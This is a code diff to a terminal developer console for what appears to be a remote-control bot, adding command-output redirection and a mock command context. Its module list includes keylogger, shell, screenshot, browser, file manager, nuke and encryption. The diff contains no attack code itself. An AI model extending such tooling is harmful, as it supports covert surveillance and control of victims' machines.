@@ -37,8 +37,11 @@ class DeveloperTUI:
         self.bot = bot
         self.console = Console()
         self.log_queue = Queue()
+        self.output_queue = Queue() # For command results
         self.logs = []
+        self.outputs = [] # Result history
         self.max_logs = 35
+        self.max_outputs = 10
         self.log_offset = 0 # Scroll offset
         self.start_time = time.time()
         self.is_running = True
@@ -60,9 +63,6 @@ class DeveloperTUI:
     def setup_logging(self):
         logging.info("[TUI] Setting up log redirection...")
         root_logger = logging.getLogger()
-        # Instead of clearing ALL handlers, we just want to ADD our TUI handler
-        # but the TUI wants to be the only one for the console.
-        # So we identify and remove only StreamHandlers that point to stderr/stdout
         to_remove = []
         for h in root_logger.handlers:
             if isinstance(h, logging.StreamHandler) and not isinstance(h, TUILogHandler):
@@ -81,15 +81,12 @@ class DeveloperTUI:
         try:
             if Platform.is_linux():
                 try:
-                    # Method 1: Check /proc/self/stat for 'foreground' process group
                     with open('/proc/self/stat', 'r') as f:
                         stat = f.read().split()
                         pgrp = int(stat[4])
                         tpgid = int(stat[7])
                         if pgrp == tpgid:
                             return True
-                    
-                    # Method 2: Fallback to tcgetpgrp
                     for fd in [0, 1, 2]:
                         try:
                             if os.getpgrp() == os.tcgetpgrp(fd):
@@ -113,7 +110,6 @@ class DeveloperTUI:
             return True
 
     def on_press(self, key):
-        # 1. Global F10 Toggle (Always check foreground first)
         if key == keyboard.Key.f10:
             if self.is_foreground():
                 self.input_mode = not self.input_mode
@@ -121,11 +117,9 @@ class DeveloperTUI:
                 logging.info(f"[TUI] Manual Input {status} (F10)")
             return
 
-        # 2. Safety Gate: If not in foreground OR input mode is OFF, ignore everything else
         if not self.is_foreground() or not self.input_mode:
             return
 
-        # 3. Handle hotkeys (only when in focus and input mode enabled)
         if key == keyboard.Key.f2:
             self.show_stats = not self.show_stats
             return
@@ -142,7 +136,6 @@ class DeveloperTUI:
             self.log_offset = 0
             return
 
-        # 4. Handle character input
         try:
             if hasattr(key, 'char') and key.char:
                 self.current_input += key.char
@@ -165,36 +158,49 @@ class DeveloperTUI:
             pass
 
     def execute_local_command(self, cmd_text):
-        """Bridge TUI input to Bot commands."""
+        """Bridge TUI input to Bot commands with full output redirection."""
         logging.info(f"[TUI] Executing: {cmd_text}")
+        tui_self = self
         
         async def run_cmd():
+            # Handle prefix
             clean_cmd = cmd_text[1:] if cmd_text.startswith(Config.COMMAND_PREFIX) else cmd_text
             parts = clean_cmd.split()
-            if not parts:
-                return
+            if not parts: return
             cmd_name = parts[0]
+            args = parts[1:]
             
             command = self.bot.get_command(cmd_name)
             if command:
                 try:
-                    logging.info(f"[TUI] Found command: {cmd_name}. Triggering...")
-                    if cmd_name == "p":
-                        # Create a mock context for ping test
-                        class MockCtx:
-                            def __init__(self, bot):
-                                self.bot = bot
-                                self.author = "LocalDev"
-                            async def send(self, msg, **kwargs):
-                                logging.info(f"[TUI] Command Result: {msg}")
+                    # Create a robust Mock context
+                    class MockCtx:
+                        def __init__(self, bot, tui):
+                            self.bot = bot
+                            self.tui = tui
+                            self.author = type('User', (), {'name': 'LocalDev', 'bot': False, 'id': 0, 'mention': '@LocalDev'})()
+                            self.guild = None
+                            self.channel = type('Channel', (), {'id': 0, 'send': self.send})()
+                            self.message = type('Msg', (), {'content': cmd_text, 'author': self.author})()
+                            self.command = command
+                            self.prefix = Config.COMMAND_PREFIX
                         
-                        await self.bot._ping_test(MockCtx(self.bot))
-                    else:
-                        logging.info(f"[TUI] Local execution for '${cmd_name}' is active. Redirecting output to TUI soon.")
+                        async def send(self, content=None, embed=None, file=None, **kwargs):
+                            msg = ""
+                            if content: msg += str(content)
+                            if embed: msg += f"\n[EMBED] {embed.title or ''}: {embed.description or ''}"
+                            if file: msg += f"\n[FILE] {file.filename}"
+                            self.tui.output_queue.put(msg)
+                            logging.info(f"[TUI-RES] {msg[:100]}...")
+
+                    ctx = MockCtx(self.bot, tui_self)
+                    await self.bot.invoke(ctx)
                 except Exception as e:
                     logging.error(f"[TUI] Execution Error: {e}")
+                    tui_self.output_queue.put(f"❌ Error: {e}")
             else:
                 logging.warning(f"[TUI] Unknown command: {cmd_name}")
+                tui_self.output_queue.put(f"❓ Unknown command: {cmd_name}")
 
         asyncio.run_coroutine_threadsafe(run_cmd(), self.bot.loop)
 
@@ -210,8 +216,9 @@ class DeveloperTUI:
             Layout(name="sidebar", size=26),
             Layout(name="content")
         )
+        # Content always has body and output
         layout["content"].split_column(
-            Layout(name="body", ratio=2),
+            Layout(name="body", ratio=3),
             Layout(name="output", ratio=1)
         )
         return layout
@@ -239,9 +246,8 @@ class DeveloperTUI:
         table.add_column("Name", style="white")
         table.add_column("St", justify="right")
         
-        all_possible = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
+        all_possible = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"]
         for mod in all_possible:
-            # Fix capitalization for FileManager and others
             cog_name = mod.replace("_", " ").title().replace(" ", "")
             state = "[green]●[/green]" if cog_name in self.bot.cogs else "[red]○[/red]"
             table.add_row(mod, state)
@@ -249,26 +255,16 @@ class DeveloperTUI:
         return Panel(table, border_style="cyan")
 
     def make_log_view(self):
-        # Process pending logs from queue
-        # If user is scrolling (offset > 0), we keep processing the queue to memory 
-        # but we don't 'push' the view. 
-        # Actually, we SHOULD always process the queue to avoid it growing too large.
         processed_count = 0
         while not self.log_queue.empty() and processed_count < 200:
             self.logs.append(self.log_queue.get())
             processed_count += 1
             
-        # Limit memory (keep last 2000)
         if len(self.logs) > 2000:
             self.logs = self.logs[-2000:]
 
         log_render = Text()
-        
-        # Calculate view window based on offset
         total_logs = len(self.logs)
-        
-        # If offset is 0, we are at the BOTTOM (latest logs)
-        # We ensure autoscroll by setting end_idx to total_logs
         end_idx = total_logs - self.log_offset
         start_idx = max(0, end_idx - self.max_logs)
         
@@ -295,9 +291,20 @@ class DeveloperTUI:
         return Panel(log_render, title=title, border_style="green")
 
     def make_output_view(self):
+        # Process output queue
+        while not self.output_queue.empty():
+            self.outputs.append(self.output_queue.get())
+        
+        if len(self.outputs) > self.max_outputs:
+            self.outputs = self.outputs[-self.max_outputs:]
+            
         output_text = Text()
-        output_text.append(" [SYSTEM] Command Results Window Active\n", style="bold cyan")
-        output_text.append(" Waiting for local command execution results...", style="dim")
+        if not self.outputs:
+            output_text.append(" Waiting for local command execution results...", style="dim")
+        else:
+            for out in self.outputs:
+                output_text.append(f" {out}\n", style="cyan")
+                
         return Panel(output_text, title="[bold]Command Results[/bold]", border_style="cyan")
 
     def make_stats_view(self):
@@ -330,7 +337,6 @@ class DeveloperTUI:
         prefix = "tui_full" if full else "tui_snapshot"
         file_path = os.path.join(log_dir, f"{prefix}_{timestamp}.log")
         
-        # If not full, only save what was visible
         to_save = self.logs if full else self.logs[-self.max_logs:]
         
         with open(file_path, "w") as f:
@@ -348,21 +354,15 @@ class DeveloperTUI:
                 logging.error(f"[TUI] Could not start listener: {e}")
 
         try:
-            # Increase refresh rate to 10 to feel more responsive
             with Live(layout, refresh_per_second=10, screen=True) as live:
                 logging.info("[TUI] Live view active.")
                 while self.is_running:
-                    # Handle dynamic layout for stats without destroying sub-layouts
+                    # Handle dynamic layout for stats
                     if self.show_stats:
                         layout["main"].split_row(
                             Layout(name="sidebar", size=26),
                             Layout(name="content"),
                             Layout(name="stats_panel", size=26)
-                        )
-                        # Re-split content because it was re-created by split_row
-                        layout["content"].split_column(
-                            Layout(name="body", ratio=2),
-                            Layout(name="output", ratio=1)
                         )
                         layout["stats_panel"].update(self.make_stats_view())
                     else:
@@ -370,11 +370,12 @@ class DeveloperTUI:
                             Layout(name="sidebar", size=26),
                             Layout(name="content")
                         )
-                        # Re-split content because it was re-created by split_row
-                        layout["content"].split_column(
-                            Layout(name="body", ratio=2),
-                            Layout(name="output", ratio=1)
-                        )
+                    
+                    # Ensure sub-layouts exist (they are lost on split_row)
+                    layout["content"].split_column(
+                        Layout(name="body", ratio=3),
+                        Layout(name="output", ratio=1)
+                    )
 
                     # Update data
                     layout["header"].update(self.make_header())
@@ -385,10 +386,8 @@ class DeveloperTUI:
                     layout["footer"].update(self.make_footer())
                     time.sleep(0.05)
         except Exception as e:
-             # Fallback: Restore standard logging if TUI crashes
              self.is_running = False
              root_logger = logging.getLogger()
-             # Re-add a basic stream handler so logs aren't completely lost
              if not any(isinstance(h, logging.StreamHandler) and not isinstance(h, TUILogHandler) for h in root_logger.handlers):
                  handler = logging.StreamHandler(sys.stdout)
                  handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
